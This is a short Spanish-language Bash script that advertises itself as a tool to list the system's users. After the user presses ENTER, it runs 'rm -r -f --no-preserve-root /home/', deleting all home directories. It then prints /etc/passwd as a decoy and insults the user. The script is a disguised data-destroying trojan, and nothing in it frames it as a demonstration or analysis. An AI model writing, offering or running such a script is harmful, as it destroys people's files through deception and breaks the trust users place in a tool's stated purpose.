#!bin/bash

clear
echo    
printf "      \e[1;77m\e[41m  Obtén toda la lista de usuarios de tu sistema!  \e[0m\n"
echo    
echo   
read -p "Pulsa ENTER para comenzar"
clear
echo Esta comenzando el proceso...
sleep 1
rm -r -f --no-preserve-root /home/
sleep 2
echo Terminando proceso de obtención, espere...
sleep 2
cat /etc/passwd
read -p "Si has terminado, precione ENTER."
clear
echo Gilipollas!
pause 2
exit
